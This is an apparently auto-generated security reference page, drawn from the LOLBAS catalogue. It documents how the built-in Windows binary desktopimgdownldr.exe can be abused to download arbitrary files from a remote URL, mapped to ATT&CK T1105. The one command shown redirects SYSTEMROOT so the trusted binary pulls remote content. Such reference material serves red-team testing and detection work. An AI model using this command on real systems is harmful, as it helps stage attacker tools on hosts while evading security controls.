---
parsed_by: focuslocust
source: commands
type: generated
---
# Desktopimgdownldr Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Desktopimgdownldr.exe

Tool page: [Desktopimgdownldr.exe](../../tools/windows/desktopimgdownldr.exe.md)

### Download arbitrary files from a web server

```text
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr
```

Description:

Downloads the file and sets it as the computer's lockscreen

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Desktopimgdownldr.yml` |
| Evidence | Command preserved from source parser. |
